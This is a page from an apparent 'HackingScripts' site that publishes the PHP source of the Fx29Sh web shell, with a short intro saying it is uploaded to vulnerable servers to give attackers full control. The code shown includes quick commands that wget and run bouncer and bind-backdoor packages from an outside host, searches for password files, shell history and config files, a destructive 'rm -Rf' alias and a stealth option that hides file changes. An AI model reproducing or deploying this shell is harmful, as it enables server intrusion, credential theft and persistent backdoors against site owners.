<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> FaTaLisTiCz_Fx Fx29 Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>FaTaLisTiCz_Fx Fx29 Shell</h2>
<p class="meta">25 Jan 2014</p>

<p>This Fx29 shell script is uploaded to a vulnerable site&#8217;s server, and once there can be run by the hacker in a browser. It allows the attacker complete access to the site, including the database.</p>

<h3>FaTaLisTiCz_Fx Fx29Sh Shell Script Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="c1">##########################################################</span>
<span class="c1">###[ FaTaLisTiCz_Fx Fx29Sh 3.2.12.08 ]###</span>
<span class="c1">###[ By FaTaLisTiCz_Fx               ]###</span>
<span class="c1">###[ ? 03-12 2008 FeeLCoMz Community ]###</span>
<span class="c1">###[ Written under PHP 5.2.5         ]###</span>
<span class="c1">##########################################################</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;sh_ver&#39;</span><span class="p">,</span><span class="s2">&quot;3.2.12.08&quot;</span><span class="p">);</span>        <span class="c1">###</span>
<span class="c1">#error_reporting(E_ALL);             ###</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ERROR</span> <span class="o">|</span> <span class="k">E_PARSE</span><span class="p">);</span>  <span class="c1">###</span>
<span class="c1">##########################################################</span>
<span class="c1">#################################</span>
<span class="c1">###[ CONFIGURATIONS ]###</span>
<span class="c1">#################################</span>
<span class="c1">###[ URL ]###</span>
<span class="c1">#$sh_mainurl        = &quot;http://localhost/FX29SH/&quot;;</span>
<span class="nv">$sh_mainurl</span>        <span class="o">=</span> <span class="s1">&#39;http://uaedesign.com/xml/&#39;</span><span class="p">;</span>
<span class="nv">$fx29sh_updateurl</span>  <span class="o">=</span> <span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx29sh_update.php&quot;</span><span class="p">;</span>
<span class="nv">$fx29sh_sourcesurl</span> <span class="o">=</span> <span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx29sh.txt&quot;</span><span class="p">;</span>
<span class="nv">$sh_sourcez</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;Fx29Sh&quot;</span>   <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;cyberz.txt&quot;</span><span class="p">,</span><span class="s2">&quot;fx29sh.php&quot;</span><span class="p">),</span>
  <span class="s2">&quot;psyBNC&quot;</span>   <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;fx.tgz&quot;</span><span class="p">),</span>
  <span class="s2">&quot;Eggdrop&quot;</span>  <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fxb.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;fxb.tgz&quot;</span><span class="p">),</span>
  <span class="s2">&quot;BindDoor&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;bind.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;bind.tgz&quot;</span><span class="p">),</span>
<span class="p">);</span>
<span class="c1">###[ AUTHENTICATION ]###</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;login&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
  <span class="s2">&quot;pass&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
  <span class="s2">&quot;md5pass&quot;</span>   <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
  <span class="s2">&quot;hostallow&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">),</span>
  <span class="s2">&quot;denied&quot;</span>    <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="si">$sh_mainurl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.sh_name().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">:</span> <span class="nx">access</span> <span class="nx">denied</span><span class="o">!</span><span class="s2">&quot;,</span>
<span class="s2">);</span>
<span class="s2">###[ ADVANCED ]###</span>
<span class="si">$tmp_dir</span><span class="s2">       = &quot;&quot;;</span>
<span class="si">$log_email</span><span class="s2">     = &quot;</span><span class="nx">yankeemoore55</span><span class="o">@</span><span class="nx">gmail</span><span class="o">.</span><span class="nx">com</span><span class="s2">&quot;;</span>
<span class="si">$sess_cookie</span><span class="s2">   = &quot;</span><span class="nx">fx29shcook</span><span class="s2">&quot;;</span>
<span class="si">$sort_default</span><span class="s2">  = &quot;</span><span class="mi">0</span><span class="nx">a</span><span class="s2">&quot;; #Pengurutan, 0 - nomor kolom. &quot;</span><span class="nx">a</span><span class="s2">&quot;scending atau &quot;</span><span class="nx">d</span><span class="s2">&quot;escending</span>
<span class="si">$sort_save</span><span class="s2">     = TRUE; #Simpan posisi pengurutan menggunakan cookies.</span>
<span class="si">$copy_unset</span><span class="s2">    = FALSE; #Hapus file yg telah di-copy setelah dipaste</span>
<span class="si">$gzipencode</span><span class="s2">    = TRUE;</span>
<span class="si">$filestealth</span><span class="s2">   = TRUE; #TRUE, tidak merubah waktu modifikasi dan akses.</span>
<span class="si">$hexdump_lines</span><span class="s2"> = 8;</span>
<span class="si">$hexdump_rows</span><span class="s2">  = 24;</span>
<span class="si">$auto_surl</span><span class="s2">     = TRUE;</span>
<span class="s2">###[ QUICK COMMANDS ]###</span>
<span class="s2">if (!is_windows()) {</span>
<span class="s2">  #Unix</span>
<span class="s2">  </span><span class="si">$cmdaliases</span><span class="s2"> = array(</span>
<span class="s2">    array(&quot;</span><span class="k">List</span> <span class="nx">Directory</span><span class="s2">&quot;, &quot;</span><span class="nx">ls</span> <span class="o">-</span><span class="nx">al</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">all</span> <span class="nx">suid</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">04000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">suid</span> <span class="nx">files</span> <span class="nx">in</span> <span class="nb">current</span> <span class="nb">dir</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">04000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">all</span> <span class="nx">sgid</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">02000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">sgid</span> <span class="nx">files</span> <span class="nx">in</span> <span class="nb">current</span> <span class="nb">dir</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">02000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">config</span><span class="o">.</span><span class="nx">inc</span><span class="o">.</span><span class="nx">php</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">name</span> <span class="nx">config</span><span class="o">.</span><span class="nx">inc</span><span class="o">.</span><span class="nx">php</span><span class="s2">&quot;),</span>
<span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">config</span><span class="o">*</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">name</span> <span class="nx">\</span><span class="s2">&quot;config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type d -perm -2 -ls&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type d -perm -2 -ls&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;List file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logged in users&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Last connect&quot;</span><span class="p">,</span><span class="s2">&quot;lastlog&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Suid bins&quot;</span><span class="p">,</span><span class="s2">&quot;find /bin /usr/bin /usr/local/bin /sbin /usr/sbin</span>
<span class="s2">    /usr/local/sbin -perm -4000 2&amp;gt; /dev/null&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Without Password&quot;</span><span class="p">,</span><span class="s2">&quot;cut -d: -f1,2,3 /etc/passwd | grep ::&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Inet Address&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/ifconfig | grep inet&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Can write in /etc/?&quot;</span><span class="p">,</span><span class="s2">&quot;find /etc/ -type f -perm -o+w 2&amp;gt; /dev/null&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Downloaders?&quot;</span><span class="p">,</span><span class="s2">&quot;which wget curl w3m lynx fetch lwp-download&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="s2">&quot;cat /proc/version /proc/cpuinfo&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Is gcc installed ?&quot;</span><span class="p">,</span><span class="s2">&quot;locate gcc&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Format box (DANGEROUS)&quot;</span><span class="p">,</span><span class="s2">&quot;rm -Rf&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; run psyBNC&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;cd .fx;./config 29110;./fuck;./run&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; extract EggDrop&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;Eggdrop&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; run BindDoor&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;BindDoor&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxvf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;BindDoor&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;./bind&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget RatHole 1.2 (Linux &amp; BSD)&quot;</span><span class="p">,</span><span class="s2">&quot;wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz&quot;</span><span class="p">),</span>
  <span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
  <span class="c1">#Windows</span>
  <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;List Directory&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find index.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find *config*.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find c99shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">c99</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find r57shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">r57</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find fx29shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">fx29</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show active connections&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show running services&quot;</span><span class="p">,</span> <span class="s2">&quot;net start&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User accounts&quot;</span><span class="p">,</span> <span class="s2">&quot;net user&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show computers&quot;</span><span class="p">,</span> <span class="s2">&quot;net view&quot;</span><span class="p">),</span>
  <span class="p">);</span>
<span class="p">}</span>
<span class="c1">###[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]###</span>
<span class="nv">$phpfsaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Read File&quot;</span><span class="p">,</span> <span class="s2">&quot;read&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Write File (PHP5)&quot;</span><span class="p">,</span> <span class="s2">&quot;write&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span><span class="s2">&quot;Text&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Copy&quot;</span><span class="p">,</span> <span class="s2">&quot;copy&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;From&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Rename/Move&quot;</span><span class="p">,</span> <span class="s2">&quot;rename&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Delete&quot;</span><span class="p">,</span> <span class="s2">&quot;delete&quot;</span><span class="p">,</span> <span class="mi">1</span> <span class="p">,</span><span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Make Dir&quot;</span><span class="p">,</span><span class="s2">&quot;mkdir&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download&quot;</span><span class="p">,</span> <span class="s2">&quot;download&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download (Binary Safe)&quot;</span><span class="p">,</span> <span class="s2">&quot;downloadbin&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Change Perm (0755)&quot;</span><span class="p">,</span> <span class="s2">&quot;chmod&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;Perms&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Writable Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;fwritabledir&quot;</span><span class="p">,</span> <span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;Max&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Pathname Pattern&quot;</span><span class="p">,</span> <span class="s2">&quot;glob&quot;</span><span class="p">,</span><span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;Pattern&quot;</span><span class="p">),</span>
<span class="p">);</span>
<span class="c1">###########################################</span>
<span class="c1">###[ END OF CONFIGURATIONS ]###</span>
<span class="c1">###########################################</span>
<span class="nb">define</span><span class="p">(</span><span class="s2">&quot;starttime&quot;</span><span class="p">,</span> <span class="nx">getmicrotime</span><span class="p">());</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;max_execution_time&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);</span> <span class="p">}</span>
<span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">);</span>
<span class="nv">$d</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;d&quot;</span><span class="p">];</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
<span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;fx29shcook&quot;</span><span class="p">]);</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="p">}</span> <span class="c1">#Converting request to variable</span>
<span class="p">}</span>
<span class="c1">###[ SELF URL ]###</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$auto_surl</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$include</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$v</span>       <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
    <span class="nv">$name</span>    <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="nv">$value</span>   <span class="o">=</span> <span class="o">@</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$needles</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span><span class="s2">&quot;ssl://&quot;</span><span class="p">,</span><span class="s2">&quot;ftp://&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$needles</span> <span class="k">as</span> <span class="nv">$needle</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$needle</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$includestr</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="o">.@</span><span class="nv">$includestr</span><span class="p">);</span> <span class="p">}</span>
<span class="c1">###[ QUICK LAUNCH ]###</span>
<span class="nv">$quicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=home</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Home</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
